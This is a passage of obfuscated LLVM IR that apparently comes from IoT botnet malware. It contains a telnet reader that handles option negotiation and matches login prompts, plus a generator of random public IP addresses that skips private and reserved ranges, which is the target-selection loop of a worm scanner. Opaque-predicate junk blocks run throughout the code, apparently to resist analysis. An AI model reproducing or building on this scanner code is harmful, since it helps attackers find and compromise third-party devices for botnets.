  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %248, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %249

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #2, !srcloc !4
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* @x.49
  %62 = load i32, i32* @y.50
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %60
  %69 = load i32, i32* %10, align 4
  %70 = srem i32 %69, 64
  %71 = zext i32 %70 to i64
  %72 = shl i64 1, %71
  %73 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %74 = load i32, i32* %10, align 4
  %75 = sdiv i32 %74, 64
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [16 x i64], [16 x i64]* %73, i64 0, i64 %76
  %78 = load i64, i64* %77, align 8
  %79 = or i64 %78, %72
  store i64 %79, i64* %77, align 8
  %80 = load i32, i32* %10, align 4
  %81 = add nsw i32 %80, 1
  %82 = call i32 @select(i32 %81, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %83 = icmp slt i32 %82, 1
  %84 = load i32, i32* @x.49
  %85 = load i32, i32* @y.50
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %83, label %92, label %93

; <label>:92:                                     ; preds = %originalBBpart2
  br label %249

; <label>:93:                                     ; preds = %originalBBpart2
  %94 = load i8*, i8** %15, align 8
  %95 = load i32, i32* %18, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  store i8* %97, i8** %23, align 8
  %98 = load i32, i32* %10, align 4
  %99 = load i8*, i8** %23, align 8
  %100 = call i64 @recv(i32 %98, i8* %99, i64 1, i32 0)
  %101 = trunc i64 %100 to i32
  store i32 %101, i32* %19, align 4
  %102 = load i32, i32* %19, align 4
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %123, label %104

; <label>:104:                                    ; preds = %93
  %105 = load i32, i32* @x.49
  %106 = load i32, i32* @y.50
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %104
  %113 = load i32, i32* %19, align 4
  %114 = icmp eq i32 %113, 0
  %115 = load i32, i32* @x.49
  %116 = load i32, i32* @y.50
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %114, label %123, label %124

; <label>:123:                                    ; preds = %originalBBpart229, %93
  store i32 0, i32* %9, align 4
  br label %254

; <label>:124:                                    ; preds = %originalBBpart229
  %125 = load i32, i32* %19, align 4
  %126 = load i32, i32* %18, align 4
  %127 = add nsw i32 %126, %125
  store i32 %127, i32* %18, align 4
  %128 = load i8*, i8** %23, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 255
  br i1 %131, label %132, label %218

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* %10, align 4
  %134 = load i8*, i8** %23, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = call i64 @recv(i32 %133, i8* %135, i64 2, i32 0)
  %137 = trunc i64 %136 to i32
  store i32 %137, i32* %19, align 4
  %138 = load i32, i32* %19, align 4
  %139 = icmp eq i32 %138, -1
  br i1 %139, label %143, label %140

; <label>:140:                                    ; preds = %132
  %141 = load i32, i32* %19, align 4
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %160

; <label>:143:                                    ; preds = %140, %132
  %144 = load i32, i32* @x.49
  %145 = load i32, i32* @y.50
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %143
  store i32 0, i32* %9, align 4
  %152 = load i32, i32* @x.49
  %153 = load i32, i32* @y.50
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %254

; <label>:160:                                    ; preds = %140
  %161 = load i32, i32* @x.49
  %162 = load i32, i32* @y.50
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %160
  %169 = load i32, i32* %19, align 4
  %170 = load i32, i32* %18, align 4
  %171 = add nsw i32 %170, %169
  store i32 %171, i32* %18, align 4
  %172 = load i32, i32* %10, align 4
  %173 = load i8*, i8** %23, align 8
  %174 = call i32 @negotiate(i32 %172, i8* %173, i32 3)
  %175 = icmp ne i32 %174, 0
  %176 = load i32, i32* @x.49
  %177 = load i32, i32* @y.50
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart247, label %originalBB35alteredBB

originalBBpart247:                                ; preds = %originalBB35
  br i1 %175, label %201, label %184

; <label>:184:                                    ; preds = %originalBBpart247
  %185 = load i32, i32* @x.49
  %186 = load i32, i32* @y.50
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %184
  store i32 0, i32* %9, align 4
  %193 = load i32, i32* @x.49
  %194 = load i32, i32* @y.50
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %254

; <label>:201:                                    ; preds = %originalBBpart247
  %202 = load i32, i32* @x.49
  %203 = load i32, i32* @y.50
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %201
  %210 = load i32, i32* @x.49
  %211 = load i32, i32* @y.50
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %248

; <label>:218:                                    ; preds = %124
  %219 = load i8*, i8** %15, align 8
  %220 = load i8*, i8** %11, align 8
  %221 = call i8* @strstr(i8* %219, i8* %220) #10
  %222 = icmp ne i8* %221, null
  br i1 %222, label %230, label %223

; <label>:223:                                    ; preds = %218
  %224 = load i32, i32* %12, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %231

; <label>:226:                                    ; preds = %223
  %227 = load i8*, i8** %15, align 8
  %228 = call i32 @matchPrompt(i8* %227)
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %230, label %231

; <label>:230:                                    ; preds = %226, %218
  store i32 1, i32* %20, align 4
  br label %249

; <label>:231:                                    ; preds = %226, %223
  %232 = load i32, i32* @x.49
  %233 = load i32, i32* @y.50
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %231
  %240 = load i32, i32* @x.49
  %241 = load i32, i32* @y.50
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %248

; <label>:248:                                    ; preds = %originalBBpart259, %originalBBpart255
  br label %33

; <label>:249:                                    ; preds = %230, %92, %48
  %250 = load i32, i32* %20, align 4
  %251 = icmp ne i32 %250, 0
  br i1 %251, label %252, label %253

; <label>:252:                                    ; preds = %249
  store i32 1, i32* %9, align 4
  br label %254

; <label>:253:                                    ; preds = %249
  store i32 0, i32* %9, align 4
  br label %254

; <label>:254:                                    ; preds = %253, %252, %originalBBpart251, %originalBBpart233, %123
  %255 = load i32, i32* %9, align 4
  ret i32 %255

originalBBalteredBB:                              ; preds = %originalBB, %60
  %256 = load i32, i32* %10, align 4
  %_ = sub i32 %256, 64
  %gen = mul i32 %_, 64
  %_1 = shl i32 %256, 64
  %_2 = sub i32 0, %256
  %gen3 = add i32 %_2, 64
  %_4 = sub i32 0, %256
  %gen5 = add i32 %_4, 64
  %_6 = sub i32 %256, 64
  %gen7 = mul i32 %_6, 64
  %_8 = sub i32 %256, 64
  %gen9 = mul i32 %_8, 64
  %257 = srem i32 %256, 64
  %258 = zext i32 %257 to i64
  %_10 = sub i64 1, %258
  %gen11 = mul i64 %_10, %258
  %_12 = shl i64 1, %258
  %259 = shl i64 1, %258
  %260 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %261 = load i32, i32* %10, align 4
  %_13 = sub i32 0, %261
  %gen14 = add i32 %_13, 64
  %262 = sdiv i32 %261, 64
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds [16 x i64], [16 x i64]* %260, i64 0, i64 %263
  %265 = load i64, i64* %264, align 8
  %_15 = sub i64 %265, %259
  %gen16 = mul i64 %_15, %259
  %266 = or i64 %265, %259
  store i64 %266, i64* %264, align 8
  %267 = load i32, i32* %10, align 4
  %_17 = sub i32 0, %267
  %gen18 = add i32 %_17, 1
  %_19 = sub i32 0, %267
  %gen20 = add i32 %_19, 1
  %_21 = shl i32 %267, 1
  %_22 = shl i32 %267, 1
  %_23 = sub i32 %267, 1
  %gen24 = mul i32 %_23, 1
  %_25 = sub i32 %267, 1
  %gen26 = mul i32 %_25, 1
  %268 = add nsw i32 %267, 1
  %269 = call i32 @select(i32 %268, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %270 = icmp slt i32 %269, 1
  br label %originalBB

originalBB27alteredBB:                            ; preds = %originalBB27, %104
  %271 = load i32, i32* %19, align 4
  %272 = icmp eq i32 %271, 0
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %143
  store i32 0, i32* %9, align 4
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %160
  %273 = load i32, i32* %19, align 4
  %274 = load i32, i32* %18, align 4
  %_36 = sub i32 0, %274
  %gen37 = add i32 %_36, %273
  %_38 = shl i32 %274, %273
  %_39 = sub i32 0, %274
  %gen40 = add i32 %_39, %273
  %_41 = sub i32 %274, %273
  %gen42 = mul i32 %_41, %273
  %_43 = shl i32 %274, %273
  %_44 = sub i32 %274, %273
  %gen45 = mul i32 %_44, %273
  %275 = add nsw i32 %274, %273
  store i32 %275, i32* %18, align 4
  %276 = load i32, i32* %10, align 4
  %277 = load i8*, i8** %23, align 8
  %278 = call i32 @negotiate(i32 %276, i8* %277, i32 3)
  %279 = icmp ne i32 %278, 0
  br label %originalBB35

originalBB49alteredBB:                            ; preds = %originalBB49, %184
  store i32 0, i32* %9, align 4
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %201
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %231
  br label %originalBB57
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %4 = zext i8 %3 to i32
  %5 = icmp sge i32 %4, 255
  br i1 %5, label %6, label %21

; <label>:6:                                      ; preds = %0
  %7 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %8 = add i8 %7, 1
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %10 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %11 = zext i8 %10 to i32
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %13 = zext i8 %12 to i32
  %14 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = zext i8 %14 to i32
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %17 = zext i8 %16 to i32
  %18 = call i32 (i8*, i8*, ...) @szprintf(i8* %9, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %11, i32 %13, i32 %15, i32 %17)
  %19 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %20 = call i32 @inet_addr(i8* %19) #2
  store i32 %20, i32* %1, align 4
  br label %506

; <label>:21:                                     ; preds = %0
  %22 = load i32, i32* @x.51
  %23 = load i32, i32* @y.52
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp sge i32 %31, 255
  %33 = load i32, i32* @x.51
  %34 = load i32, i32* @y.52
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %72

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.51
  %43 = load i32, i32* @y.52
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %51 = add i8 %50, 1
  store i8 %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %52 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %53 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %54 = zext i8 %53 to i32
  %55 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %58 = zext i8 %57 to i32
  %59 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %60 = zext i8 %59 to i32
  %61 = call i32 (i8*, i8*, ...) @szprintf(i8* %52, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %54, i32 %56, i32 %58, i32 %60)
  %62 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %63 = call i32 @inet_addr(i8* %62) #2
  store i32 %63, i32* %1, align 4
  %64 = load i32, i32* @x.51
  %65 = load i32, i32* @y.52
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %506

; <label>:72:                                     ; preds = %originalBBpart2
  %73 = load i32, i32* @x.51
  %74 = load i32, i32* @y.52
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %72
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %82 = zext i8 %81 to i32
  %83 = icmp sge i32 %82, 255
  %84 = load i32, i32* @x.51
  %85 = load i32, i32* @y.52
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br i1 %83, label %92, label %117

; <label>:92:                                     ; preds = %originalBBpart210
  %93 = call i32 @rand() #2
  %94 = srem i32 %93, 255
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %96 = call i32 @rand() #2
  %97 = srem i32 %96, 255
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %99 = call i32 @rand() #2
  %100 = srem i32 %99, 255
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %102 = call i32 @rand() #2
  %103 = srem i32 %102, 255
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %105 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %107 = zext i8 %106 to i32
  %108 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %109 = zext i8 %108 to i32
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %111 = zext i8 %110 to i32
  %112 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %113 = zext i8 %112 to i32
  %114 = call i32 (i8*, i8*, ...) @szprintf(i8* %105, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.47, i32 0, i32 0), i32 %107, i32 %109, i32 %111, i32 %113)
  %115 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %116 = call i32 @inet_addr(i8* %115) #2
  store i32 %116, i32* %1, align 4
  br label %506

; <label>:117:                                    ; preds = %originalBBpart210
  %118 = load i32, i32* @x.51
  %119 = load i32, i32* @y.52
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %117
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %127 = add i8 %126, 1
  store i8 %127, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %128 = load i32, i32* @x.51
  %129 = load i32, i32* @y.52
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart231, label %originalBB12alteredBB

originalBBpart231:                                ; preds = %originalBB12
  br label %136

; <label>:136:                                    ; preds = %originalBBpart299, %originalBBpart231
  %137 = load i32, i32* @x.51
  %138 = load i32, i32* @y.52
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %136
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  %148 = load i32, i32* @x.51
  %149 = load i32, i32* @y.52
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %147, label %446, label %156

; <label>:156:                                    ; preds = %originalBBpart235
  %157 = load i32, i32* @x.51
  %158 = load i32, i32* @y.52
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %156
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 10
  %168 = load i32, i32* @x.51
  %169 = load i32, i32* @y.52
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %167, label %446, label %176

; <label>:176:                                    ; preds = %originalBBpart239
  %177 = load i32, i32* @x.51
  %178 = load i32, i32* @y.52
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %176
  %185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 100
  %188 = load i32, i32* @x.51
  %189 = load i32, i32* @y.52
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %187, label %196, label %204

; <label>:196:                                    ; preds = %originalBBpart243
  %197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %198 = zext i8 %197 to i32
  %199 = icmp sge i32 %198, 64
  br i1 %199, label %200, label %204

; <label>:200:                                    ; preds = %196
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %202 = zext i8 %201 to i32
  %203 = icmp sle i32 %202, 127
  br i1 %203, label %446, label %204

; <label>:204:                                    ; preds = %200, %196, %originalBBpart243
  %205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 127
  br i1 %207, label %446, label %208

; <label>:208:                                    ; preds = %204
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %210 = zext i8 %209 to i32
  %211 = icmp eq i32 %210, 169
  br i1 %211, label %212, label %232

; <label>:212:                                    ; preds = %208
  %213 = load i32, i32* @x.51
  %214 = load i32, i32* @y.52
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %212
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 254
  %224 = load i32, i32* @x.51
  %225 = load i32, i32* @y.52
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %223, label %446, label %232

; <label>:232:                                    ; preds = %originalBBpart247, %208
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 172
  br i1 %235, label %236, label %244

; <label>:236:                                    ; preds = %232
  %237 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %238 = zext i8 %237 to i32
  %239 = icmp sle i32 %238, 16
  br i1 %239, label %240, label %244

; <label>:240:                                    ; preds = %236
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %242 = zext i8 %241 to i32
  %243 = icmp sle i32 %242, 31
  br i1 %243, label %446, label %244

